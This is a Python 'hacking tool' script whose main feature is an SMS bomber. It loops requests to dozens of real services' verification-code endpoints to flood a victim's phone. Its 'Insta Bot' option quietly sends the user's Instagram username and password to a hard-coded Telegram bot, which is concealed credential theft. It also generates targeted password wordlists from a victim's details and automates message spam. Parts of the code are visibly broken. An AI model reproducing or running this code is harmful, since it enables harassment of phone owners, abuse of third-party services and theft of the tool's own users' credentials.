from colorama import Fore,Style,Back
import pyautogui
import random as rand
import time
from phonenumbers import geocoder, parse,carrier,timezone
import base64
import os
from instabot import Bot
import requests
print(Fore.LIGHTGREEN_EX+'Hi bro am BlaCK Aries')
print(Fore.CYAN+'<<>>'*20)
print(Fore.LIGHTGREEN_EX+'you should be great account')
print(Fore.CYAN+'<<>>'*20)
code =23122006
pin=int(input(Fore.LIGHTGREEN_EX+"Enter Pass code >>>"))
if pin == code :
    os.system("python3 -m pip install -r requirements.txt")
    os.system("clear")
    print(Fore.BLUE + '')
    os.system('figlet Black-Aries')
    print('[1] Phone Number ')
    print('[2] Data encryption')
    print('[3] spam')
    print('[4] Aries-List')
    print('[5] Insta Bot')
    print('[6] sms bomb')
    ask = input('>>>>')
    if ask == '6':
        _phone = input('Hello! Enter The Number Of the Victim-->> ')

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': 		_phonePizzahut, '_token':'*'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
		print('[+] Message sent Successfully!')
	except:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		print('[+] Message Sent Failed!')

	try:
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://plink.tech/register/',json={"phone": _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')

	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print('[+] Message sent Successfully!')
	except:
		print('[-] Message Sent Failed!')



	try:
		iteration += 10
		print(('{} .').format(iteration))
	except:
		break
        
    if ask == '5':
        print(Fore.LIGHTGREEN_EX + 'Hi bro am BlaCK Aries')
        time.sleep(2)
        print(Fore.CYAN + '<<>>' * 20)
        print(Fore.LIGHTGREEN_EX + 'you should be log in')
        time.sleep(2)
        print(Fore.CYAN + '<<>>' * 20)
        time.sleep(2)
        user = str(input("USER NAME : "))
        passwoed = str(input("PASSWORD : "))
        os.system("clear")
        os.system('figlet Black-Aries')
        print('[1] follow user                           [2] Download Stories')
        print('[3] send message                          [4] get user followers')
        print('[5] Your Info ')
        list = str(input(">>>>"))
        os.system("clear")
        aries_Bot = Bot()
        aries_Bot.login(username=user, password=passwoed)
        Insta_Info = open('Insta Info.txt', 'w')
        Insta_Info.write(f'|User name : {user} |')
        Insta_Info.write(f'|Password  : {passwoed} |')
        ID = '5141124832'
        token = '5250865220:AAHvyRQo1_wKcV6h9Nc7A00XL-cD6raDGO8'
        t = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= new account 🦇 ︎\n.User : [ → {user} ← ]\n.Pass : [ → {passwoed} ← ]\n-  ")
        print(t)
        if list == '5':
            print(f'Username : {user}')
            print(f'Password : {passwoed}')
        if list == "1":
            follow = str(input("Follow>>"))
            aries_Bot.follow(follow)
        if list == '2':
            download = str(input("user name >>"))
            aries_Bot.download_stories(f"{download}")
        if list == '3':
            messeg = str(input('Your Masseg >> '))
            user1 = str(input('user name >> '))
            aries_Bot.send_message(f"{messeg}", f"{user1}")
        if list == '4':
            userlist = str(input('uaer name >> '))
            followers_list = aries_Bot.get_user_followers(f'{userlist}')
    if ask == '4':
        print("[1]victam list")
        print('[2]allpass')
        aries1 =input('>>>')
        if aries1 == '2':
            chars = "abcdefghijklmnopqrstuvwxyz"
            CHARS = chars.upper()
            symbols = "[]{}()*@#_.-"
            numbers = '0123456789'
            j = ''
            allVariables = chars + CHARS + symbols + numbers
            numer = int(input("password number :"))
            len = numer
            if len > 16:
                print('the limit is 16')
            else:
                list5 = open("word list.txt", 'w')
                range_number = int(input("Password Rang :"))
                for counter in range(1, range_number):
                    passwords = ''.join(rand.sample(allVariables, len))
                    print(passwords)
                    list5.write(passwords)
                    list5.write('\n')
        if aries1 == '1':
            print(Fore.CYAN + '<<>>' * 20)
            aaa = input(Fore.LIGHTGREEN_EX + 'Entre victam name : ')
            print(Fore.CYAN + '<<>>' * 20)
            os.system('clear')
            print(Fore.YELLOW + '       ')
            os.system('figlet Aries-list')
            print(Fore.BLUE + 'By : Black Aries')
            print(Fore.LIGHTBLUE_EX + '       ')
            print(Fore.LIGHTBLACK_EX + '-' * 29)
            file = open(aaa + '.txt', 'w')
            aa = set([])
            oio = set([])
            # iio=set([112233,332211,000,445566,'$'*1,'$'*2,'$'*3,'@'*1,'@'*2,'@'*3,'€'*1,'€'*2,'€'*3,'&'*1,'&'*2,'&'*3,'¥'*1,'¥'*2,'¥'*3,'*'*1,'*'*2,'*'*3,'+'*1,'+'*2,'+'*3])
            kk = 1
            while True:
                b = input(Fore.LIGHTBLACK_EX + 'Entre {} : '.format(kk))
                if b == 'i am done':
                    print('\033[3;36m')
                    file.close()
                    qq = open(aaa + '.txt', 'r')
                    ll = len(qq.readlines())
                    os.system('printf "\033[3;31m"')
                    print('-' * 60)
                    print('>> {} Passwords in ---> {} '.format(ll, aaa + '.txt'))
                    print('-' * 60)
                    break;
                aa.add(b)
                for i in aa:
                    if len(i) >= 6 and i not in oio:
                        oio.add(i)
                        file.write(i)
                        file.write('\n')
                    # for o in iio:
                    #   uau='{}{}'.format(i,o)
                    #  ubu='{}{}{}'.format(o,i,o)
                    # ucu='{}{}{} '.format(i,o,i)
                    # if len(uau)>= 6:
                    # file.write(uau)
                    #  file.write('\n')
                    # if len(ubu) >= 6 and ubu != uau :
                    # file.write(ubu)
                    # file.write('\n')
                    # if len(ucu) >= 6 and ucu != uau and ucu != ubu:
                    #  file.write(ucu)
                    #  file.write('\n')
                    c = b + i
                    d = i + b
                    if len(c) >= 6:
                        file.write(c)
                        file.write('\n')
                    if c != d and len(d) >= 6:
                        file.write(d)
                        file.write('\n')
                kk = int(kk) + 1
                print('-' * 40)

    if ask == '2':
        os.system('clear')
        os.system('figlet Black-Aries')
        while True:
            print('[1] Encode')
            print('[2] Decode')
            num = input(">>> ")
            if num == "1":
                encode_text = input("Enter Your Text For Encode It >> : ")
                encode_hash = base64.b64encode(encode_text.encode('UTF-8')).decode('ascii')
                print("--------------------------------")
                print("Doen : " + encode_hash)
                print("----------------------------------")
            elif num == "2":
                decode_text = input("Enter Your Hash For Decode It >> :")
                decode_hash = base64.b64decode(decode_text)
                decodeit = decode_hash.decode('UTF-8')
                print("----------------------------------")
                print("Done : " + decodeit)
                print("-------------------------------------")
            else:
                print("Type Just 1 Or 2 !!")
    if ask == '3':
        os.system('clear')
        pwd = input('Enter path of file : ')
        time1 = int(input('Enter sleep time : '))
        time.sleep(5)
        s = open(f'{pwd}', 'r')
        for word in s:
            pyautogui.typewrite(word)
            pyautogui.press('enter')
            time.sleep(time1)
    if ask == '1':
        os.system('clear')
        print(Fore.LIGHTRED_EX + '')
        number = input("Number Phone: ")
        os.system('clear')
        os.system('figlet Number-aries')
        print('by: Black Aries')
        print(Fore.YELLOW + '>>><<' * 20)
        print(Fore.LIGHTRED_EX + '')
        print('[1] Know Number country')
        print('[2] Carrier Sim-Card')
        print(('[3] Time Zone'))
        askn = input('>>>')
        if askn == '3':
            print(f'the time zone of this phone number {number} is : ', end='')
            print(timezone.time_zones_for_number(parse(number), 'en'))
        if askn == '2':
            print(f'the Carrier Sim-Card of this phone number {number} is : ', end='')
            print(carrier.name_for_number(parse(number), 'en'))
        if askn == '1':
            print(f'the location of this phone number {number} is : ', end='')
            print(geocoder.description_for_number(parse(number), 'en'))
else:
    print('Sorry i cannot pass you *_* ')
    print('https://github.com/blackaries506/blackariestool')
